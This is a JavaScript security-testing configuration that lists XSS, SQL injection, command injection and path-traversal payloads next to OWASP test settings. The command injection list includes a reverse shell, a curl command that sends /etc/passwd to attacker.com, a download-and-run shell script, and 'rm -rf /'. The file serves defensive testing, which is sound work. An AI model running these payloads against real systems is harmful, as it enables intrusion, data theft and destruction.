/**
 * Comprehensive Security Testing Configuration
 * Robotics & Control Ltd - Enterprise Security Validation
 * 
 * This configuration file defines test environments, security testing parameters,
 * and validation criteria for comprehensive security testing.
 */

const crypto = require('crypto');

// ==================== TEST ENVIRONMENT CONFIGURATION ====================

const SECURITY_TEST_CONFIG = {
    // Test environment settings
    environment: {
        testMode: true,
        allowTestSecrets: true,
        logLevel: 'detailed',
        mockExternalServices: true
    },
    
    // Test secrets (for testing only - never use in production)
    testSecrets: {
        JWT_SECRET: 'test_jwt_secret_for_security_validation_only_' + crypto.randomBytes(32).toString('hex'),
        ADMIN_API_KEY: 'test_admin_key_' + crypto.randomBytes(16).toString('hex'),
        SESSION_SECRET: 'test_session_secret_' + crypto.randomBytes(32).toString('hex')
    },
    
    // Security testing parameters
    tests: {
        // Input validation tests
        xssPayloads: [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload="alert(\'XSS\')">',
            '<input onfocus="alert(\'XSS\')" autofocus>',
            '<select onfocus="alert(\'XSS\')" autofocus>'
        ],
        
        // SQL injection payloads (even though no SQL is currently used)
        sqlInjectionPayloads: [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 --",
            "1' AND '1'='1",
            "' OR ''='",
            "1'; WAITFOR DELAY '00:00:10'; --"
        ],
        
        // Command injection payloads
        commandInjectionPayloads: [
            "; cat /etc/passwd",
            "&& whoami",
            "| ls -la",
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "; nc -e /bin/sh attacker.com 4444",
            "&& curl -d @/etc/passwd attacker.com",
            "; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
        ],
        
        // Path traversal payloads
        pathTraversalPayloads: [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
        ],
        
        // Rate limiting test parameters
        rateLimiting: {
            normalRequestRate: 50, // requests per minute
            burstRequestRate: 200, // requests in 10 seconds
            sustainedAttackRate: 500, // requests over 5 minutes
            suspiciousThreshold: 100 // suspicious requests per minute
        },
        
        // Security headers to validate
        requiredHeaders: [
            'X-Content-Type-Options',
            'X-Frame-Options', 
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Permissions-Policy',
            'X-DNS-Prefetch-Control'
        ],
        
        // OWASP Top 10 test categories
        owaspTests: {
            'A01-Broken-Access-Control': {
                testEndpoints: ['/admin', '/api/admin', '/security-report'],
                testMethods: ['GET', 'POST', 'PUT', 'DELETE'],
                expectedStatus: [401, 403]
            },
            'A02-Cryptographic-Failures': {
                testPlaintextStorage: true,
                testWeakEncryption: true,
                testCertificateValidation: true
            },
            'A03-Injection': {
                testXSS: true,
                testSQLInjection: true,
                testCommandInjection: true,
                testLDAPInjection: false
            },
            'A04-Insecure-Design': {
                testBusinessLogic: true,
                testSecurityPatterns: true,
                testThreatModeling: true
            },
            'A05-Security-Misconfiguration': {
                testDefaultCredentials: true,
                testErrorHandling: true,
                testSecurityHeaders: true,
                testHttpMethods: true
            },
            'A06-Vulnerable-Components': {
                testDependencyScanning: true,
                testOutdatedPackages: true,
                testKnownVulnerabilities: true
            },
            'A07-Authentication-Failures': {
                testBruteForce: true,
                testWeakPasswords: false, // No password auth implemented
                testSessionManagement: true,
                testMultiFactor: false
            },
            'A08-Software-Integrity': {
                testCodeTampering: true,
                testSupplyChain: true,
                testChecksumsValidation: true
            },
            'A09-Logging-Monitoring': {
                testSecurityEventLogging: true,
                testAuditTrail: true,
                testIncidentDetection: true,
                testRealTimeMonitoring: true
            },
            'A10-Server-Side-Request-Forgery': {
                testSSRFPrevention: true,
                testURLValidation: true,
                testInternalNetworkAccess: true
            }
        }
    },
    
    // Test result validation criteria
    validation: {
        security: {
            minimumSecurityScore: 90,
            maxCriticalVulnerabilities: 0,
            maxHighVulnerabilities: 1,
            maxModerateVulnerabilities: 5
        },
        performance: {
            maxResponseTime: 2000, // 2 seconds
            maxSecurityOverhead: 50 // 50ms additional overhead
        },
        compliance: {
            requiredCompliances: ['OWASP', 'GDPR-Basic', 'ISO27001-Basic'],
            auditLevel: 'comprehensive'
        }
    },
    
    // Reporting configuration
    reporting: {
        outputDir: './security-test-reports',
        formats: ['json', 'html', 'csv'],
        includeRemediation: true,
        includeCompliance: true,
        includeMetrics: true
    }
};

module.exports = SECURITY_TEST_CONFIG;